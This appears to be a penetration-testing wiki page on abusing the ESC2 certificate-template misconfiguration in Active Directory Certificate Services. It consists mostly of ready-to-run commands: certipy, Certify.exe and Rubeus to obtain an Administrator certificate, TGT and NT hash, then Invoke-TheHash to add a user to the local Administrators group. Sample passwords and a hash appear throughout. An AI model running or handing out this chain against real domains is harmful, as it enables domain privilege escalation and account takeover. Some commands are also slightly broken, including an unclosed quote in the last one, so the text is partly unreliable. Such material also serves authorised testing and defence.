---
description: ESC | Active Directory Certificate Services
---

# ESC2

If a certificate template allows "Any Purpose" or doesnt specify any specific usage, the certifcate can be used for anything, like client authentication, server auth or code signin. If it also lets you specify a Subject Alternative Name or SAN it can be exploited like ESC1.

{% hint style="danger" %}
A certificate template with no specific usage (like a subordinate CA certificate) can be used to sign new certificates, giving you the ability to set any usage or fields in the certificates you create.\
\
If output from certipy show Any Purpose EKU, it allows specifying a SAN, which makes it vulnerable to ESC2 and ESC1.
{% endhint %}

```bash
# Find vulnerabilities
certipy-ad find -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -vulnerable -stdout

# Showing
[!] Vulnerabilities
         ESC2                              : 'LAB.LOCAL\\Domain Users' can enroll and template can be used for any purpose 
```

### <mark style="color:yellow;">ESC2 from Linux</mark>

To abuse the ESC1 template we can use certipy to request a Certificate and include a alternate subject. This is done with `req` and `-upn Administrator` (or any other user.

```bash
certipy req -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC2 -upn Administrator
```

#### Authenticate with certificate and get a TGT

```
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```

### <mark style="color:yellow;">ESC2 Abuse from Windows</mark>

Enumeration with Certify.exe

```powershell
# Certify
.\Certify.exe find /vulnerable

# ADCS Enumeration
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

#### Convert certificate and get NT hash

```powershell
# Request wilt alternate SAN
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC2 /altname:administrator@lab.local

# With OpenSSL convert certificate to pfx from cert.pem
.& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate with certificate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

Use Invoke-TheHash to perfrom pass the hash

```powershell
# Import Invoke-TheHash
.\Invoke-TheHash.psm1

# Use Invoke-TheHash to add user
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add
```
